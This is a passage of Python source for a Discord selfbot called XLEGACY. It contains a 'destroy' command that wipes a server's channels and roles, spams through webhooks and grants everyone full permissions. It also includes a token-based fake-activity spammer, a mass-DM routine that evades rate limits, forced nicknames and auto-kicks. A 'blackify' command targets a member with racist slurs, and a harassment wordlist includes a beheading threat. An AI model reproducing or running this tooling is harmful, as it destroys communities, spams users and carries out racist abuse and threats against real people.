        reactions_enabled = not reactions_enabled  
        status = "ENABLED" if reactions_enabled else "DISABLED"
        await ctx.send(f"```ansi\n{red} XLEGACY | PING REACTIONS {status} | {custom_reaction} |  {reset}\n```")

    elif action.lower() == "list":
        if reactions_enabled:
            await ctx.send(f"```ansi\n{red} XLEGACY | PING REACTIONS ENABLED | {custom_reaction} |  {reset}\n```")
        else:
            await ctx.send(f"```ansi\n{red} XLEGACY | PING REACTIONS DISABLED |  {reset}\n```")

    elif action.lower() == "clear":
        reactions_enabled = False  
        await ctx.send(f"```ansi\n{red} XLEGACY | PING REACTIONS CLEARED |  {reset}\n```")

    else:
        await ctx.send(f"```ansi\n{red} XLEGACY | INVALID ACTION | USE TOGGLE/LIST/CLEAR |  {reset}\n```")

# Add conversation flow for fakeactive command
conversation_flow = [
    ("Hello everyone!", "Hey there!"),
    ("How's it going?", "Pretty good, thanks!"),
    ("Anyone online?", "I'm here!"),
    ("What's up?", "Not much, just chilling"),
    ("Good morning!", "Morning!"),
]

async def read_tokens():
    try:
        with open('token.txt', 'r') as file:
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        return []

async def send_fake_reply(token, channel_id, message, response, delay):
    await asyncio.sleep(delay)  

    headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
    }

    async with aiohttp.ClientSession() as session:
        async with session.post(f'https://discord.com/api/v9/channels/{channel_id}/typing', headers=headers):
            await asyncio.sleep(random.uniform(2, 5))  

        payload = {'content': message}
        
        async with session.post(f'https://discord.com/api/v9/channels/{channel_id}/messages', headers=headers, json=payload) as resp:
            if resp.status == 200:
                print(f"{red}Message sent with token: {token[-4:]}{reset}")
                sent_message_data = await resp.json()
                sent_message_id = sent_message_data['id']

                await asyncio.sleep(3)  
                
                async with session.post(f'https://discord.com/api/v9/channels/{channel_id}/typing', headers=headers):
                    await asyncio.sleep(random.uniform(2, 5))  

                response_token = random.choice([t for t in tokenss if t != token])  

                await asyncio.sleep(random.uniform(2, 5)) 
                response_payload = {
                    'content': response,
                    'message_reference': {'message_id': sent_message_id}
                }
                
                async with session.post(f'https://discord.com/api/v9/channels/{channel_id}/messages', 
                                      headers={'Authorization': response_token, 'Content-Type': 'application/json'}, 
                                      json=response_payload) as resp:
                    if resp.status == 200:
                        print(f"{red}Response sent with token: {response_token[-4:]}{reset}")
                    elif resp.status == 429:
                        retry_after = int(resp.headers.get("Retry-After", 1))
                        print(f"{light_red}Rate limited on response with token: {response_token[-4:]}. Retrying after {retry_after} seconds...{reset}")
                        await asyncio.sleep(retry_after)
                    else:
                        print(f"{light_red}Failed to send response with token: {response_token[-4:]}. Status code: {resp.status}{reset}")
            elif resp.status == 429:
                retry_after = int(resp.headers.get("Retry-After", 1))
                print(f"{light_red}Rate limited on send with token: {token[-4:]}. Retrying after {retry_after} seconds...{reset}")
                await asyncio.sleep(retry_after)
            else:
                print(f"{light_red}Failed to send message with token: {token[-4:]}. Status code: {resp.status}{reset}")

@bot.command(name='fakeactive')
async def fake_active(ctx):
    global fake_activity_active
    fake_activity_active = True  
    global tokenss 
    tokenss = await read_tokens() 
    
    if not tokenss:
        await ctx.send(f"```ansi\n{red} XLEGACY | NO TOKENS FOUND |  {reset}\n```")
        return

    await ctx.send(f"```ansi\n{red} XLEGACY | FAKE ACTIVITY STARTED |  {reset}\n```")
    channel = ctx.channel

    for index, (message, response) in enumerate(conversation_flow):
        token = tokenss[index % len(tokenss)] 
        delay = index * 1 + random.randint(1, 1)  
        asyncio.create_task(send_fake_reply(token, channel.id, message, response, delay))

@bot.command(name='fakeactiveoff')
async def fake_active_off(ctx):
    global fake_activity_active
    fake_activity_active = False 
    await ctx.send(f"```ansi\n{red} XLEGACY | FAKE ACTIVITY STOPPED |  {reset}\n```")

async def count_down(token, channel_id, message):
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
    }

    while True:
        async with aiohttp.ClientSession() as session:
            payload = {'content': message}
            async with session.post(f'https://discord.com/api/v9/channels/{channel_id}/messages', headers=headers, json=payload) as resp:
                if resp.status == 200:
                    print(f"{red}Countdown message sent with token: {token[-4:]}{reset}")
                    return  
                elif resp.status == 429:
                    retry_after = float(resp.headers.get("Retry-After", 1))
                    print(f"{light_red}Rate limited on countdown with token: {token[-4:]}. Retrying after {retry_after} seconds...{reset}")
                    await asyncio.sleep(retry_after)  
                else:
                    print(f"{light_red}Failed to send countdown with token: {token[-4:]}. Status code: {resp.status}{reset}")
                    return

@bot.command(name="mcountdown")
async def mcountdown(ctx, member: discord.Member, count: int):
    global mcountdown_active
    mcountdown_active = True  
    count = abs(count)
    channel_id = ctx.channel.id

    await ctx.send(f"```ansi\n{red} XLEGACY | MCOUNTDOWN STARTED | {member.name} | {count} |  {reset}\n```")

    for i in range(count, 0, -1):
        if not mcountdown_active: 
            break
        token = random.choice(tokens)
        countdown_message = f"{member.mention} **{i}**"
        await count_down(token, channel_id, countdown_message)
        await asyncio.sleep(1)

    if mcountdown_active:
        await ctx.send(f"```ansi\n{red} XLEGACY | MCOUNTDOWN COMPLETE |  {reset}\n```")
    mcountdown_active = False

@bot.command(name="mcountdownoff")
async def mcountdownoff(ctx):
    global mcountdown_active
    mcountdown_active = False
    await ctx.send(f"```ansi\n{red} XLEGACY | MCOUNTDOWN STOPPED |  {reset}\n```")

@bot.command(name="countdown")
async def countdown(ctx, member: discord.Member, count: int):
    global countdown_active
    countdown_active = True  
    count = abs(count)

    await ctx.send(f"```ansi\n{red} XLEGACY | COUNTDOWN STARTED | {member.name} | {count} |  {reset}\n```")

    for i in range(count, 0, -1):
        if not countdown_active:
            break
        countdown_message = f"{member.mention} **{i}**"
        await ctx.send(countdown_message)
        await asyncio.sleep(1)

    if countdown_active:
        await ctx.send(f"```ansi\n{red} XLEGACY | COUNTDOWN COMPLETE |  {reset}\n```")
    countdown_active = False

@bot.command(name="countdownoff")
async def countdownoff(ctx):
    global countdown_active
    countdown_active = False
    await ctx.send(f"```ansi\n{red} XLEGACY | COUNTDOWN STOPPED |  {reset}\n```")

@bot.command(name="autonick")
async def autonick(ctx, action: str, member: discord.Member = None, *, nickname: str = None):
    global forced_nicknames

    if action == "toggle":
        if member is None or nickname is None:
            await ctx.send(f"```ansi\n{red} XLEGACY | PROVIDE USER AND NICKNAME |  {reset}\n```")
            return

        if ctx.guild.me.guild_permissions.manage_nicknames:
            forced_nicknames[member.id] = nickname
            await member.edit(nick=nickname)
            await ctx.send(f"```ansi\n{red} XLEGACY | NICKNAME SET | {member.name} -> {nickname} |  {reset}\n```")
        else:
            await ctx.send(f"```ansi\n{red} XLEGACY | NO PERMISSION TO CHANGE NICKNAMES |  {reset}\n```")

    elif action == "list":
        if forced_nicknames:
            user_list = "\n".join([f"<@{user_id}>: '{name}'" for user_id, name in forced_nicknames.items()])
            await ctx.send(f"```ansi\n{red} XLEGACY | FORCED NICKNAMES |  {reset}\n\n{user_list}```")
        else:
            await ctx.send(f"```ansi\n{red} XLEGACY | NO FORCED NICKNAMES |  {reset}\n```")

    elif action == "clear":
        if member is None:
            forced_nicknames.clear()
            await ctx.send(f"```ansi\n{red} XLEGACY | ALL NICKNAMES CLEARED |  {reset}\n```")
        else:
            if member.id in forced_nicknames:
                del forced_nicknames[member.id]
                await member.edit(nick=None)  
                await ctx.send(f"```ansi\n{red} XLEGACY | NICKNAME CLEARED | {member.name} |  {reset}\n```")
            else:
                await ctx.send(f"```ansi\n{red} XLEGACY | NO FORCED NICKNAME | {member.name} |  {reset}\n```")
    else:
        await ctx.send(f"```ansi\n{red} XLEGACY | INVALID ACTION | USE TOGGLE/LIST/CLEAR |  {reset}\n```")

@bot.event
async def on_member_update(before, after):
    if before.nick != after.nick and after.id in forced_nicknames:
        forced_nickname = forced_nicknames[after.id]
        if after.nick != forced_nickname:  
            try:
                await after.edit(nick=forced_nickname)
                print(f"{red}Nickname for {after.display_name} reset to forced nickname '{forced_nickname}'{reset}")
            except discord.errors.Forbidden:
                print(f"{light_red}No permission to change nicknames{reset}")

@bot.command(name="forcepurge")
async def forcepurge(ctx, action: str, member: discord.Member = None):
    if action.lower() == "toggle":
        if member is None:
            await ctx.send(f"```ansi\n{red} XLEGACY | PROVIDE USER TO TOGGLE |  {reset}\n```")
            return
        force_delete_users[member.id] = not force_delete_users[member.id]
        status = "ENABLED" if force_delete_users[member.id] else "DISABLED"
        await ctx.send(f"```ansi\n{red} XLEGACY | AUTO-DELETE {status} | {member.name} |  {reset}\n```")

    elif action.lower() == "list":
        enabled_users = [f"<@{user_id}>" for user_id, enabled in force_delete_users.items() if enabled]
        if enabled_users:
            await ctx.send(f"```ansi\n{red} XLEGACY | AUTO-DELETE USERS |  {reset}\n\n" + "\n".join(enabled_users) + "```")
        else:
            await ctx.send(f"```ansi\n{red} XLEGACY | NO AUTO-DELETE USERS |  {reset}\n```")

    elif action.lower() == "clear":
        force_delete_users.clear()
        await ctx.send(f"```ansi\n{red} XLEGACY | AUTO-DELETE CLEARED |  {reset}\n```")

    else:
        await ctx.send(f"```ansi\n{red} XLEGACY | INVALID ACTION | USE TOGGLE/LIST/CLEAR |  {reset}\n```")


# Add these to your global variables
auto_kick_users = {}
blackify_tasks = {}
blackifys = [
    "woah jamal dont pull out the nine",
    "cotton picker 🧑‍🌾",
    "back in my time...",
    "worthless nigger! 🥷",
    "chicken warrior 🍗",
    "its just some watermelon chill 🍉",
    "are you darkskined perchance?",
    "you... STINK 🤢"
]
excluded_user_ids = [1264384711430766744, 1229216985213304928]
config_file = "nuke_config.json"

default_config = {
    "webhook_message": "@everyone JOIN discord.gg/guest",
    "server_name": "XLEGACY SB",
    "webhook_delay": 0.3,
    "channel_name": "xlegacy-nuke"  
}

def load_config():
    if os.path.exists(config_file):
        with open(config_file, 'r') as f:
            return json.load(f)
    else:
        save_config(default_config)
        return default_config

def save_config(config):
    with open(config_file, 'w') as f:
        json.dump(config, f, indent=4)

configss = load_config()

@bot.event
async def on_member_join(member):
    if member.id in auto_kick_users:
        try:
            await member.kick(reason="XLEGACY Auto-Kick")
            print(f"{red}Kicked {member.display_name} for auto-kick.{reset}")
        except discord.Forbidden:
            print(f"{light_red}No permission to kick {member.display_name}.{reset}")

@bot.command()
async def blackify(ctx, user: discord.Member):
    blackify_tasks[user.id] = True
    await ctx.send(f"```ansi\n{red} XLEGACY | BLACKIFY STARTED | {user.name} |  {reset}\n```")
    emojis = ['🍉', '🍗', '🤢', '🥷', '🔫']
    while blackify_tasks.get(user.id, False):
        try:
            async for message in ctx.channel.history(limit=10):
                if message.author.id == user.id:
                    for emoji in emojis:
                        try:
                            await message.add_reaction(emoji)
                        except:
                            pass
                    try:
                        reply = random.choice(blackifys)
                        await message.reply(f"```ansi\n{red} XLEGACY | {reply} |  {reset}\n```")
                    except:
                        pass
                    break
            await asyncio.sleep(1)
        except:
            pass

@bot.command()
async def unblackify(ctx, user: discord.Member):
    if user.id in blackify_tasks:
        blackify_tasks[user.id] = False
        await ctx.send(f"```ansi\n{red} XLEGACY | BLACKIFY STOPPED | {user.name} |  {reset}\n```")
    else:
        await ctx.send(f"```ansi\n{red} XLEGACY | NO BLACKIFY FOUND | {user.name} |  {reset}\n```")

async def try_action(action):
    try:
        return await action()
    except discord.Forbidden:
        return None
    except Exception as e:
        print(f"{light_red}Error during action: {e}{reset}")
        return None

async def send_webhooks(webhook, total_webhook_messages):
    while total_webhook_messages < 5000:
        await webhook.send(configss["webhook_message"])  
        total_webhook_messages += 1
        await asyncio.sleep(configss["webhook_delay"])  

@bot.command()
async def nukehook(ctx, *, new_message):
    configss["webhook_message"] = new_message
    save_config(configss)
    await ctx.send(f"```ansi\n{red} XLEGACY | WEBHOOK MESSAGE SET | {new_message} |  {reset}\n```")

@bot.command()
async def hookclear(ctx):
    configss["webhook_message"] = "@everyone JOIN XLEGACY"
    save_config(configss)
    await ctx.send(f"```ansi\n{red} XLEGACY | WEBHOOK MESSAGE CLEARED |  {reset}\n```")

@bot.command()
async def nukename(ctx, *, new_name):
    configss["server_name"] = new_name
    save_config(configss)
    await ctx.send(f"```ansi\n{red} XLEGACY | NUKE NAME SET | {new_name} |  {reset}\n```")

@bot.command()
async def nukedelay(ctx, delay: float):
    if delay <= 0:
        await ctx.send(f"```ansi\n{red} XLEGACY | INVALID DELAY | MUST BE > 0 |  {reset}\n```")
        return
    configss["webhook_delay"] = delay
    save_config(configss)
    await ctx.send(f"```ansi\n{red} XLEGACY | NUKE DELAY SET | {delay}s |  {reset}\n```")

@bot.command()
async def nukechannel(ctx, *, new_channel_name):
    configss["channel_name"] = new_channel_name
    save_config(configss)
    await ctx.send(f"```ansi\n{red} XLEGACY | CHANNEL NAME SET | {new_channel_name} |  {reset}\n```")

@bot.command()
async def nukeconfig(ctx):
    config_message = fr"""
{red}──────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}
                                {red}XLEGACY NUKE CONFIG{reset}
                                {light_red}Webhook Message: {red}{configss['webhook_message']}{reset}
                                {light_red}Server Name: {red}{configss['server_name']}{reset}
                                {light_red}Webhook Delay: {red}{configss['webhook_delay']} seconds{reset}
                                {light_red}Channel Name: {red}{configss['channel_name']}{reset}

{red}
  __   ___      ______ _____          _______     __
 \ \ / / |    |  ____/ ____|   /\   / ____\ \   / /
  \ V /| |    | |__ | |  __   /  \ | |     \ \_/ / 
   > < | |    |  __|| | |_ | / /\ \| |      \   /  
  / . \| |____| |___| |__| |/ ____ \ |____   | |   
 /_/ \_\______|______\_____/_/    \_\_____|  |_| 
{red}──────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}
"""
    await ctx.send(f"```ansi\n{config_message}\n```")

@bot.command()
async def autonuke(ctx, action: str, user: discord.Member = None):
    if action.lower() == "toggle":
        if user is None:
            await ctx.send(f"```ansi\n{red} XLEGACY | PROVIDE USER TO TOGGLE |  {reset}\n```")
            return
        
        if user.id in auto_kick_users:
            del auto_kick_users[user.id]
            await ctx.send(f"```ansi\n{red} XLEGACY | AUTO-KICK DISABLED | {user.name} |  {reset}\n```")
        else:
            auto_kick_users[user.id] = True
            await ctx.send(f"```ansi\n{red} XLEGACY | AUTO-KICK ENABLED | {user.name} |  {reset}\n```")
    
    elif action.lower() == "list":
        if auto_kick_users:
            user_list = "\n".join([f"<@{user_id}>" for user_id in auto_kick_users.keys()])
            await ctx.send(f"```ansi\n{red} XLEGACY | AUTO-KICK USERS |  {reset}\n\n{user_list}```")
        else:
            await ctx.send(f"```ansi\n{red} XLEGACY | NO AUTO-KICK USERS |  {reset}\n```")
    
    elif action.lower() == "clear":
        auto_kick_users.clear()
        await ctx.send(f"```ansi\n{red} XLEGACY | AUTO-KICK CLEARED |  {reset}\n```")
    
    else:
        await ctx.send(f"```ansi\n{red} XLEGACY | INVALID ACTION | USE TOGGLE/LIST/CLEAR |  {reset}\n```")
@bot.command()
async def destroy(ctx):
    global webhook_spam

    if ctx.guild.id == 1289325760040927264:
        await ctx.send(f"```ansi\n{red} XLEGACY | COMMAND DISABLED FOR THIS SERVER |  {reset}\n```")
        return

    if not configss:
        await ctx.send(f"```ansi\n{red} XLEGACY | NO CONFIG FOUND | USE DEFAULT SETTINGS? TYPE 'YES' TO CONTINUE OR 'NO' TO CANCEL |  {reset}\n```")

        def check(msg):
            return msg.author == ctx.author and msg.channel == ctx.channel

        try:
            msg = await bot.wait_for('message', check=check, timeout=30.0)
            if msg.content.lower() == "yes":
                configss.update({
                    "webhook_message": "JOIN discord.gg/guest",
                    "server_name": "XLEGACY Selfbot /guest",
                    "webhook_delay": 0.3,
                    "channel_name": "xlegacy-nuke"
                })
            elif msg.content.lower() == "no":
                await ctx.send(f"```ansi\n{red} XLEGACY | OPERATION CANCELLED |  {reset}\n```")
                await ctx.send(f"""```ansi
{light_red}[ {red}1{light_red} ] {black}nukehook - Change the webhook message for the nuke process.
{light_red}[ {red}2{light_red} ] {black}nukename - Change the Discord server name for the nuke process.
{light_red}[ {red}3{light_red} ] {black}nukedelay - Change the delay between webhook messages.
{light_red}[ {red}4{light_red} ] {black}nukechannel - Change the channel name used for the webhook.
{light_red}[ {red}5{light_red} ] {black}nukeconfig - Show the current configuration for the nuke process.```""")
                return
            else:
                await ctx.send(f"```ansi\n{red} XLEGACY | INVALID RESPONSE | OPERATION CANCELLED |  {reset}\n```")
                return
        except asyncio.TimeoutError:
            await ctx.send(f"```ansi\n{red} XLEGACY | TIMEOUT | COMMAND CANCELLED |  {reset}\n```")
            return

    await ctx.send(f"```ansi\n{red} XLEGACY | CONFIRM DESTRUCTION | TYPE 'YES' TO CONTINUE |  {reset}\n```")
    
    def check(msg):
        return msg.author == ctx.author and msg.channel == ctx.channel
    
    try:
        msg = await bot.wait_for('message', check=check, timeout=30.0)
        if msg.content.lower() != "yes":
            await ctx.send(f"```ansi\n{red} XLEGACY | OPERATION CANCELLED |  {reset}\n```")
            return
    except asyncio.TimeoutError:
        await ctx.send(f"```ansi\n{red} XLEGACY | TIMEOUT | COMMAND CANCELLED |  {reset}\n```")
        return
    
    await ctx.send(f"```ansi\n{red} XLEGACY | DESTRUCTION PROCESS STARTING |  {reset}\n```")

    async def spam_webhook(webhook):
        while webhook_spam:
            try:
                await webhook.send(content=configss["webhook_message"])
                await asyncio.sleep(configss["webhook_delay"])
            except:
                break

    async def create_webhook_channel(i):
        try:
            channel = await ctx.guild.create_text_channel(f"/{configss['channel_name']} {i+1}")
            webhook = await channel.create_webhook(name="XLEGACY Webhook")
            asyncio.create_task(spam_webhook(webhook))
            return True
        except:
            return False

    async def delete_channel(channel):
        try:
            if not channel.name.startswith(f"/{configss['channel_name']}"):
                await channel.delete()
            return True
        except:
            return False

    async def delete_role(role):
        try:
            if role.name != "@everyone":
                await role.delete()
            return True
        except:
            return False

    async def execute_destruction():
        try:
            channel_deletion_tasks = [delete_channel(channel) for channel in ctx.guild.channels]
            role_deletion_tasks = [delete_role(role) for role in ctx.guild.roles]
            
            initial_tasks = channel_deletion_tasks + role_deletion_tasks
            await asyncio.gather(*initial_tasks, return_exceptions=True)
            
            for i in range(100):
                await create_webhook_channel(i)
                await asyncio.sleep(0.1)  

            try:
                await ctx.guild.edit(name=configss["server_name"])
            except:
                pass

            try:
                everyone_role = ctx.guild.default_role
                await everyone_role.edit(permissions=discord.Permissions.all())
            except:
                pass

            return True

        except:
            return False

    try:
        await execute_destruction()
        await ctx.send(f"```ansi\n{red} XLEGACY | DESTRUCTION PROCESS COMPLETED | WEBHOOK SPAM ONGOING |  {reset}\n```")
    except:
        pass
    finally:
        await ctx.send(f"```ansi\n{red} XLEGACY | DESTRUCTION COMPLETED |  {reset}\n```")

@bot.command()
async def mdm(ctx, num_friends: int, *, message: str):
    await ctx.message.delete()
    
    async def send_message_to_friend(friend_id, friend_username):
        headers = {
            "authorization": bot.http.token,
            "Content-Type": "application/json"
        }

        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    "https://discord.com/api/v9/users/@me/channels",
                    headers=headers,
                    json={"recipient_id": friend_id}
                ) as response:
                    if response.status == 403:
                        data = await response.json()
                        if "captcha_key" in data or "captcha_sitekey" in data:
                            return False, "CAPTCHA"
                            
                    if response.status == 200:
                        dm_channel = await response.json()
                        channel_id = dm_channel["id"]
                        
                        async with session.post(
                            f"https://discord.com/api/v9/channels/{channel_id}/messages",
                            headers=headers,
                            json={"content": message}
                        ) as msg_response:
                            if msg_response.status == 403:
                                data = await msg_response.json()
                                if "captcha_key" in data or "captcha_sitekey" in data:
                                    return False, "CAPTCHA"
                                return False, "BLOCKED"
                            elif msg_response.status == 429:
                                return False, "RATELIMIT"
                            elif msg_response.status == 200:
                                return True, "SUCCESS"
                            else:
                                return False, f"ERROR_{msg_response.status}"
                                
            return False, "FAILED"
        except Exception as e:
            return False, f"ERROR: {str(e)}"

    status_msg = await ctx.send(f"```ansi\n{red} XLEGACY | INITIALIZING MASS DM OPERATION |  {reset}\n```")
    
    async with aiohttp.ClientSession() as session:
        async with session.get(
            "https://discord.com/api/v9/users/@me/relationships",
            headers={"authorization": bot.http.token}
        ) as response:
            if response.status != 200:
                await status_msg.edit(content=f"```ansi\n{red} XLEGACY | FAILED TO FETCH FRIENDS LIST |  {reset}\n```")
                return
                
            friends = await response.json()
            friends = [f for f in friends if f.get("type") == 1]
            
            if not friends:
                await status_msg.edit(content=f"```ansi\n{red} XLEGACY | NO FRIENDS FOUND |  {reset}\n```")
                return
                
            friends = friends[:num_friends]
            
            stats = {
                "success": 0,
                "blocked": 0,
                "ratelimited": 0,
                "captcha": 0,
                "failed": 0
            }
            
            start_time = time.time()
            
            for index, friend in enumerate(friends, 1):
                friend_id = friend['user']['id']
                friend_username = f"{friend['user']['username']}#{friend['user']['discriminator']}"
                
                success, status = await send_message_to_friend(friend_id, friend_username)
                
                if success:
                    stats["success"] += 1
                elif status == "BLOCKED":
                    stats["blocked"] += 1
                elif status == "RATELIMIT":
                    stats["ratelimited"] += 1
                elif status == "CAPTCHA":
                    stats["captcha"] += 1
                else:
                    stats["failed"] += 1
                
                elapsed_time = time.time() - start_time
                progress = (index / len(friends)) * 100
                msgs_per_min = (index / elapsed_time) * 60 if elapsed_time > 0 else 0
                eta = (elapsed_time / index) * (len(friends) - index) if index > 0 else 0
                
                bar_length = 20
                filled = int(progress / 100 * bar_length)
                bar = "█" * filled + "░" * (bar_length - filled)
                
                status_display = fr"""```ansi
{red} XLEGACY | MASS DM PROGRESS {reset}
{red}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}
{light_red}Progress: {red}[{bar}] {progress:.1f}%{reset}
{light_red}Successful: {red}{stats['success']} {light_red}Blocked: {red}{stats['blocked']} {light_red}Rate Limited: {red}{stats['ratelimited']}{reset}
{light_red}Captcha: {red}{stats['captcha']} {light_red}Failed: {red}{stats['failed']}{reset}
{light_red}Messages/min: {red}{msgs_per_min:.1f}{reset}
{light_red}Elapsed Time: {red}{int(elapsed_time)}s{reset}
{light_red}ETA: {red}{int(eta)}s{reset}
{light_red}Current: {red}{friend_username}{reset}
{light_red}Status: {red}{status}{reset}
{red}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}```"""
                
                await status_msg.edit(content=status_display)
                
                if index % 5 == 0:
                    delay = random.uniform(30.0, 60.0)
                    await asyncio.sleep(delay)
                else:
                    await asyncio.sleep(random.uniform(8.0, 12.0))
                    
            final_time = time.time() - start_time
            final_status = fr"""```ansi
{red} XLEGACY | MASS DM COMPLETE {reset}
{red}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}
{light_red}Successful: {red}{stats['success']}{reset}
{light_red}Blocked: {red}{stats['blocked']}{reset}
{light_red}Rate Limited: {red}{stats['ratelimited']}{reset}
{light_red}Captcha: {red}{stats['captcha']}{reset}
{light_red}Failed: {red}{stats['failed']}{reset}
{light_red}Total Time: {red}{int(final_time)}s{reset}
{light_red}Avg Speed: {red}{(stats['success'] / final_time * 60):.1f} msgs/min{reset}

{black}
  __   ___      ______ _____          _______     __
 \ \ / / |    |  ____/ ____|   /\   / ____\ \   / /
  \ V /| |    | |__ | |  __   /  \ | |     \ \_/ / 
   > < | |    |  __|| | |_ | / /\ \| |      \   /  
  / . \| |____| |___| |__| |/ ____ \ |____   | |   
 /_/ \_\______|______\_____/_/    \_\_____|  |_| 
{red}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}```"""
            
            await status_msg.edit(content=final_status)

  # Add to your global variables
laz_wordlist = [
    "# {mention}\n # you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck you fucking suck ",
    "# {mention}\n # I WOULD LOVE TO BEHEAD YOU AGAIN LMFAO I WOULD LOVE TO BEHEAD YOU AGAIN LMFAO I WOULD LOVE TO BEHEAD YOU AGAIN LMFAO I WOULD LOVE TO BEHEAD YOU AGAIN LMFAO I WOULD LOVE TO BEHEAD YOU AGAIN LMFAO I WOULD LOVE TO BEHEAD YOU AGAIN LMFAO I WOULD LOVE TO BEHEAD YOU AGAIN LMFAO I WOULD LOVE TO BEHEAD YOU AGAIN LMFAO I WOULD LOVE TO BEHEAD YOU AGAIN LMFAO I WOULD LOVE TO BEHEAD YOU AGAIN LMFAO I WOULD LOVE TO BEHEAD YOU AGAIN LMFAO I WOULD LOVE TO BEHEAD YOU AGAIN LMFAO I WOULD LOVE TO BEHEAD YOU AGAIN LMFAO I WOULD LOVE TO BEHEAD YOU AGAIN LMFAO I WOULD LOVE TO BEHEAD YOU AGAIN LMFAO I WOULD LOVE TO BEHEAD YOU AGAIN LMFAO I WOULD LOVE TO BEHEAD YOU AGAIN LMFAO I WOULD LOVE TO BEHEAD YOU AGAIN LMFAO I WOULD LOVE TO BEHEAD YOU AGAIN LMFAO I WOULD LOVE TO BEHEAD YOU AGAIN LMFAO I WOULD LOVE TO BEHEAD YOU AGAIN LMFAO I WOULD LOVE TO BEHEAD YOU AGAIN LMFAO I WOULD LOVE TO BEHEAD YOU AGAIN LMFAO I WOULD LOVE TO BEHEAD YOU AGAIN LMFAO I WOULD LOVE TO BEHEAD YOU AGAIN LMFAO I WOULD LOVE TO BEHEAD YOU AGAIN LMFAO I WOULD LOVE TO BEHEAD YOU AGAIN LMFAO I WOULD LOVE TO BEHEAD YOU AGAIN LMFAO I WOULD LOVE TO BEHEAD YOU AGAIN LMFAO I WOULD LOVE TO BEHEAD YOU AGAIN LMFAO I WOULD LOVE TO BEHEAD YOU AGAIN LMFAO I WOULD LOVE TO BEHEAD YOU AGAIN LMFAO I WOULD LOVE TO BEHEAD YOU AGAIN LMFAO I WOULD LOVE TO BEHEAD YOU AGAIN LMFAO I WOULD LOVE TO BEHEAD YOU AGAIN LMFAO ",
    "# {mention}\n # DONT BREAK NOW WE JUST STARTED DONT BREAK NOW WE JUST STARTED DONT BREAK NOW WE JUST STARTED DONT BREAK NOW WE JUST STARTED DONT BREAK NOW WE JUST STARTED DONT BREAK NOW WE JUST STARTED DONT BREAK NOW WE JUST STARTED DONT BREAK NOW WE JUST STARTED DONT BREAK NOW WE JUST STARTED DONT BREAK NOW WE JUST STARTED DONT BREAK NOW WE JUST STARTED DONT BREAK NOW WE JUST STARTED DONT BREAK NOW WE JUST STARTED DONT BREAK NOW WE JUST STARTED DONT BREAK NOW WE JUST STARTED DONT BREAK NOW WE JUST STARTED DONT BREAK NOW WE JUST STARTED DONT BREAK NOW WE JUST STARTED DONT BREAK NOW WE JUST STARTED DONT BREAK NOW WE JUST STARTED DONT BREAK NOW WE JUST STARTED DONT BREAK NOW WE JUST STARTED DONT BREAK NOW WE JUST STARTED DONT BREAK NOW WE JUST STARTED DONT BREAK NOW WE JUST STARTED DONT BREAK NOW WE JUST STARTED DONT BREAK NOW WE JUST STARTED DONT BREAK NOW WE JUST STARTED DONT BREAK NOW WE JUST STARTED DONT BREAK NOW WE JUST STARTED DONT BREAK NOW WE JUST STARTED DONT BREAK NOW WE JUST STARTED DONT BREAK NOW WE JUST STARTED DONT BREAK NOW WE JUST STARTED DONT BREAK NOW WE JUST STARTED DONT BREAK NOW WE JUST STARTED DONT BREAK NOW WE JUST STARTED DONT BREAK NOW WE JUST STARTED DONT BREAK NOW WE JUST STARTED DONT BREAK NOW WE JUST STARTED DONT BREAK NOW WE JUST STARTED DONT BREAK NOW WE JUST STARTED DONT BREAK NOW WE JUST STARTED DONT BREAK NOW WE JUST STARTED DONT BREAK NOW WE JUST STARTED DONT BREAK NOW WE JUST STARTED ",
    "# {name1} idk you fucking loser {name1} idk you fucking loser {name1} idk you fucking loser {name1} idk you fucking loser {name1} idk you fucking loser {name1} idk you fucking loser {name1} idk you fucking loser {name1} idk you fucking loser {name1} idk you fucking loser {name1} idk you fucking loser {name1} idk you fucking loser {name1} idk you fucking loser {name1} idk you fucking loser {name1} idk you fucking loser {name1} idk you fucking loser {name1} idk you fucking loser {name1} idk you fucking loser {name1} idk you fucking loser {name1} idk you fucking loser {name1} idk you fucking loser {name1} idk you fucking loser {name1} idk you fucking loser {name1} idk you fucking loser {name1} idk you fucking loser {name1} idk you fucking loser {name1} idk you fucking loser {name1} idk you fucking loser {name1} idk you fucking loser  ",
    "# {name1} your my fucking bitch {name1} your my fucking bitchyour my fucking bitch your my fucking bitch your my fucking bitch your my fucking bitch your my fucking bitch your my fucking bitch your my fucking bitch your my fucking bitch your my fucking bitch your my fucking bitch your my fucking bitch your my fucking bitch your my fucking bitch your my fucking bitch your my fucking bitch your my fucking bitch your my fucking bitch your my fucking bitch your my fucking bitch your my fucking bitch your my fucking bitch your my fucking bitch your my fucking bitch your my fucking bitch your my fucking bitch your my fucking bitch your my fucking bitch your my fucking bitch your my fucking bitch your my fucking bitch your my fucking bitch your my fucking bitch your my fucking bitch your my fucking bitch your my fucking bitch your my fucking bitch ",
